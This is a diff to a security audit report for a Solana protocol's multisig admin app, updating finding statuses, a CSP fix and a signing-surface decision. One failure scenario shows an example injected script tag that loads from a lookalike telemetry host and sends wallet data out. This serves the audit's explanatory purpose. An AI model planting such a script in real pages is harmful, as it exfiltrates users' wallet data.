@@ -84,7 +84,7 @@ The refactors after audit #1 are behaviour-equivalent, and no Critical or High f
 - **Audit #1 row in [Reviews and audits](../security/reviews-and-audits.md).** It said "Every confirmed finding is fixed (#51, #52, #54, #58)". As a description of the protocol's state, that is not accurate:
   - the reversals that resolve AV-1 and AV-2 were deferred, not fixed;
   - issues #55 and #56 are still open;
-  - CSP enforcement and the WAF rule are still deferred (A-R3-1, A-R3-5).
+  - CSP enforcement and the WAF rule were still deferred (A-R3-1, since fixed in #112; A-R3-5).
 
   Audit #1 has no standalone report, so this audit could not check its own finding list item by item. The row is corrected in this PR, and the same claim in the litepaper and the pilot paper is listed for correction in the PR description.
 
@@ -115,15 +115,15 @@ Status for every finding is **Open** and the decision is **Pending Julia** unles
 | NEW-R1-1 | Fake filings freeze exits and new guarantees in the deployed binary; the documented impact understates it | Medium ◐ | Program, docs | Proposed: correct the docs and the incident runbook; interim `caps.max_open_provisions`; ship `amend_claim` and `reinstate_guarantee` before outside capital; fix the reinstate age check | Open | Pending Julia |
 | F-R1-2 | Raising the period cap for an approved claim also raises the room for unapproved payments | Medium ✅ | Program | Proposed: `caps.max_unapproved_per_period` (ADR) | Open | Pending Julia |
 | NEW-R1-3 | No on-chain delay or veto on risk-increasing admin actions; `propose_admin` accepts any key | Medium ◐ | Program | Proposed: pending changes with a program-floored delay, a guardian veto, a Squads-vault check on `propose_admin` (ADR) | Open | Pending Julia |
-| S9 | No signer-side check of an upgrade proposal against a locally reproduced build | Medium ✅ | Scripts, runbook | Proposed: `scripts/release/check-upgrade.ts`; a hard step in spec §14.5 | Open | Pending Julia |
-| NEW-R3-1 | Admin members can only read a proposal through the origin that builds the bytes they sign | Medium ✅ | App, runbook | Proposed: an out-of-browser proposal check; approve from a second frontend; an out-of-band proposal watcher | Open | Pending Julia |
-| NEW-R3-2 | Squads config changes are offered for Approve and Execute without their arguments | Medium ✅ | App | Proposed: decode every `ConfigAction`; refuse Approve and Execute in the app or require a typed confirmation | Open | Pending Julia |
+| S9 | No signer-side check of an upgrade proposal against a locally reproduced build | Medium ✅ | Scripts, runbook | Proposed: `scripts/release/check-upgrade.ts`; a hard step in spec §14.5 | Open | Decided: approve in Squads (§5) |
+| NEW-R3-1 | Admin members can only read a proposal through the origin that builds the bytes they sign | Medium ✅ | App, runbook | Proposed: an out-of-browser proposal check; approve from a second frontend; an out-of-band proposal watcher | Open | Decided: approve in Squads (§5) |
+| NEW-R3-2 | Squads config changes are offered for Approve and Execute without their arguments | Medium ✅ | App | Proposed: decode every `ConfigAction`; refuse Approve and Execute in the app or require a typed confirmation | Open | Decided: approve in Squads (§5) |
 | AV-R1-4 | Payments-account rules are checked only at install; `pay_claim` checks the address only (also AV-R2-1) | Low ✅ | Program | Proposed: re-check owner, delegate and close authority in `pay_claim` | Open | Pending Julia |
 | NEW-R1-5 | Guardians and `pause` cannot contain an operator compromise | Low ◐ | Program | Proposed: guardians may call `revoke_operator`, or a guardian-set registry freeze bit (ADR) | Open | Pending Julia |
 | F-R1-6 | No booking path returns a mistaken or fraudulent claim payment | Low ◐ | Program | Proposed: `return_claim_payment` in Wave 2 (ADR); runbook entry now | Open | Pending Julia |
 | E-R1-7 | A compromised operator can stamp false settlement hashes for good | Low ◐ | Program | Proposed: re-settlement with a revision and an event; runbook re-check | Open | Pending Julia |
 | S10 | The live devnet test multisigs have four harness-generated member keys on one machine | Low ✅ | Deploy | Proposed: record members and custody in `deployments/devnet.json`; never carry into #91 | Open | Pending Julia (with #91, #99) |
-| A-R3-1 | The CSP is report-only, and served scripts carry no nonce, so it cannot be enforced as written | Low ✅ | App | Proposed: fix the nonce path, add a nonce test and reporting, then enforce | Open | Pending Julia |
+| A-R3-1 | The CSP is report-only, and served scripts carry no nonce, so it cannot be enforced as written | Low ✅ | App | Fixed in #112: nonce path fixed, CSP enforced, unit and e2e regression tests | Fixed | Accepted (no report endpoint) |
 | A-R3-2 | Anyone can block the `set_config` stale-carry lookup by touching future transaction PDAs | Low ◐ | App | Proposed: an on-chain `config_revision` check; interim scan from the proposal's creation slot | Open | Pending Julia |
 | A-R3-3 | Risky admin arguments are folded behind "Details" and not flagged | Low ◐ | App | Proposed: always show `set_config` diffs and role keys; flag cap loosening and unexpected keys | Open | Pending Julia |
 | A-R3-4 | On-chain refs can be linked to leases | Low ◐ | App | Proposed: salted or random guarantee ids and refs; mark the localStorage store demo-only | Open | Pending Julia |
@@ -382,7 +382,8 @@ Includes R2's NEW-R2-3.
   Likely cause, to confirm on a preview deploy: Next.js 16 reads the nonce from the request's `content-security-policy` header before the report-only one. If the static `frame-ancestors 'none'` header reaches the render, Next.js finds no `script-src` and returns no nonce.
 - **Impact:** an injected script can load more scripts from anywhere and send data to any domain (the lookalike-telemetry exfiltration of the Polymarket pattern). The planned enforcement step is blocked.
 - **Failure scenario:** a compromised bundled package injects `<script src="https://cdn-debugbear-rum.io/x.js">` and posts the wallet address and decoded proposals out. Nothing stops it.
-- **Resolution (proposed):** in `proxy.ts`, set the request header `Content-Security-Policy` to the full CSP, or move `frame-ancestors` into the proxy's CSP and drop the static CSP for page routes (keep `X-Frame-Options: DENY` for static files); a Playwright check that every `<script>` on `/admin` has a nonce; `report-to` with a rate-limited same-origin `/api/csp-report`; then enforce, with no `'unsafe-eval'` in production.
+- **Resolution (fixed, #112, merged 2026-10-31):** cause confirmed. Next.js 16 takes the nonce from the request's `content-security-policy` header, and the static `frame-ancestors 'none'` CSP from `next.config.ts` reached the render as that header. `proxy.ts` now sends the full CSP enforced and sets it on the request, overwriting any nonce-less one. The static CSP goes only to the paths and prefetch requests the proxy skips. Unit tests pin the header, the request override and the matcher sync; the e2e checks every `/reserve` tab, `/admin`, `/operator`, `/capital`, `/simulator` and the 404 page. Verified on the Vercel preview and in production: one enforced CSP on every route, and every script carries the nonce. No `report-to` endpoint was added, since it would be a new unauthenticated POST route.
+- **Original proposal:** in `proxy.ts`, set the request header `Content-Security-Policy` to the full CSP, or move `frame-ancestors` into the proxy's CSP and drop the static CSP for page routes (keep `X-Frame-Options: DENY` for static files); a Playwright check that every `<script>` on `/admin` has a nonce; `report-to` with a rate-limited same-origin `/api/csp-report`; then enforce, with no `'unsafe-eval'` in production.
 - **Reference:** pre-devnet A6.
 
 #### A-R3-2. Anyone can block the `set_config` stale-carry lookup by touching future transaction PDAs
@@ -524,7 +525,11 @@ Includes R2's NEW-R2-3.
 
 ## 5. Design decisions taken during the review
 
-None in this run. The review records findings and proposed fixes only. Julia decides each one; fixes come as separate PRs that cite the finding IDs, each with its tests first and, where it changes who can move funds, what is gated or what a cap means, a new ADR and a spec update in the same PR. This report is updated with each finding's resolution as its fix lands.
+Taken after the report was written:
+
+- **Signing surface (2026-10-29), for S9, NEW-R3-1 and NEW-R3-2.** Members approve and execute in the Squads app, not in `/admin`. `/admin` composes proposals and shows them decoded, read-only. Before approving, each member checks every proposal against the MUTAV program, and every Squads config change, from RPC on their own machine against an intent file committed before the proposal exists. The two members approve through different interfaces. The signing flow was not frozen, so this is a redesign, not a patch. The fixes are still to build.
+
+The review itself records findings and proposed fixes only. Julia decides each one; fixes come as separate PRs that cite the finding IDs, each with its tests first and, where it changes who can move funds, what is gated or what a cap means, a new ADR and a spec update in the same PR. This report is updated with each finding's resolution as its fix lands.
 
 ---
 
